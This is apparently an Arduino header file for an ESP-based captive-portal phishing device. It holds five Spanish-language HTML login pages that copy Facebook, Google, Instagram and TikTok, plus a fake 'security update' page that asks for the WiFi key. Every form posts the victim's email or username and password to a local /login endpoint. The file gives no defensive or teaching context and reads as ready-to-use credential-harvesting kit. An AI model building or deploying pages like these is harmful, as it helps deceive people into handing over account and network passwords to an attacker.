#ifndef PORTALS_H
#define PORTALS_H

#include <Arduino.h>

// --- PLANTILLA 1: FACEBOOK ---
const char html_facebook[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
  body { font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1d2129; }
  .login-container { width: 350px; background-color: white; box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.20); border-radius: 5px; padding: 20px; }
  #logo { display: block; margin: 0 auto 20px; }
  h1 { font-size: 24px; font-weight: bold; margin-bottom: 10px; text-align: center; color: #1877f2; }
  h2 { font-size: 16px; font-weight: normal; color: #606770; margin-bottom: 20px; text-align: center; }
  input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 5px 0 15px 0; display: inline-block; border: 1px solid #dddfe2; box-sizing: border-box; border-radius: 6px; font-size: 16px; }
  button { background-color: #1877F2; color: white; padding: 12px; margin: 10px 0; border: none; cursor: pointer; width: 100%; border-radius: 6px; font-size: 18px; font-weight: bold; }
</style>
</head>
<body>
<div class="login-container">
  <svg id="logo" viewBox="0 0 24 24" width="75" height="35" xmlns="http://www.w3.org/2000/svg">
    <path fill="#1877F2" d="M22 2H2C.9 2 0 2.9 0 4v16c0 1.1.9 2 2 2h9v-7h-3V11h3V9c0-2.8 2.2-5 5-5h3v3h-3c-1.1 0-2 .9-2 2v2h5l-1 3h-4v7h6c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"></path>
  </svg>
  <form action="/login" method="POST">
    <h1>Inicia sesi&oacute;n</h1>
    <h2>Utiliza tu cuenta de Facebook</h2>
    <input type="text" placeholder="Correo electr&oacute;nico" name="email" required>
    <input type="password" placeholder="Contrase&ntilde;a" name="password" required>
    <button type="submit">Entrar</button>
  </form>
</div>
</body>
</html>
)rawliteral";

// --- PLANTILLA 2: GOOGLE MODERN ---
const char html_google[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #fff; }
        .login-container { background-color: #fff; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 100%; max-width: 450px; }
        #logo { display: block; margin: 0 auto 10px; }
        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        h2 { text-align: center; font-size: 16px; font-weight: 400; margin-bottom: 30px; color: #202124; }
        .g-input { display: block; width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .gbtn-primary { display: block; width: 100%; padding: 10px; border: none; border-radius: 4px; background-color: #1a73e8; color: #fff; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/login" method="POST">
            <h1>Inicia sesi&oacute;n</h1>
            <h2>Ir a Google</h2>
            <input name="email" type="text" class="g-input" placeholder="Correo o tel&eacute;fono" required>
            <input name="password" type="password" class="g-input" placeholder="Ingresa tu contrase&ntilde;a" required>
            <button class="gbtn-primary" type="submit">Siguiente</button>
        </form>
    </div>
</body>
</html>
)rawliteral";

// --- PLANTILLA 3: WIFI NATIVO ---
const char html_wifi_native[] PROGMEM = R"=====(
<!DOCTYPE html><html>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    body { font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; background-color: #f4f4f4; padding: 40px 20px; }
    .box { background: white; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 320px; margin: auto; }
    h2 { color: #333; font-size: 20px; margin-bottom: 15px; }
    p { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 20px; }
    input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
    button { width: 100%; padding: 12px; background: #0078d7; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
    .icon { font-size: 45px; margin-bottom: 10px; }
  </style>
</head>
<body>
  <div class='box'>
    <div class='icon'>&#128274;</div>
    <h2>Actualizaci&oacute;n de Seguridad</h2>
    <p>Se requiere la clave de red para restablecer la conexi&oacute;n inal&aacute;mbrica de forma segura.</p>
    <form action='/login' method='POST'>
      <input type='hidden' name='email' value='WIFI_KEY'>
      <input type='password' name='password' placeholder='Contrase&ntilde;a de WiFi' required autofocus>
      <button type='submit'>CONECTAR</button>
    </form>
  </div>
</body>
</html>
)=====";

// --- PLANTILLA 4: INSTAGRAM ---
const char html_instagram[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { background: white; padding: 30px; border: 1px solid #dbdbdb; width: 350px; text-align: center; border-radius: 3px; }
  h2 { margin: 10px 0 20px 0; color: #262626; }
  input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 8px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
  button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 8px; font-size: 14px; }
</style>
</head>
<body>
  <div class='box'>
    <h2>Instagram</h2>
    <form action='/login' method='POST'>
      <input type='text' name='email' placeholder='Teléfono, usuario o correo' required>
      <input type='password' name='password' placeholder='Contraseña' required>
      <button type='submit'>Iniciar sesión</button>
    </form>
  </div>
</body>
</html>)rawliteral";

// --- PLANTILLA 5: TIKTOK ---
const char html_tiktok[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
  body { font-family: sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { background: #121212; padding: 40px; border-radius: 8px; width: 350px; text-align: center; border: 1px solid #333; }
  .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
  input { width: 100%; background: #2f2f2f; border: 1px solid #333; color: white; padding: 12px; margin-bottom: 15px; border-radius: 4px; box-sizing: border-box; }
  button { width: 100%; background-color: #fe2c55; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
  <div class='box'>
    <div class='logo'>TikTok</div>
    <form action='/login' method='POST'>
      <input type='text' name='email' placeholder='Correo o usuario' required>
      <input type='password' name='password' placeholder='Contraseña' required>
      <button type='submit'>Iniciar sesión</button>
    </form>
  </div>
</body>
</html>)rawliteral";

#endif

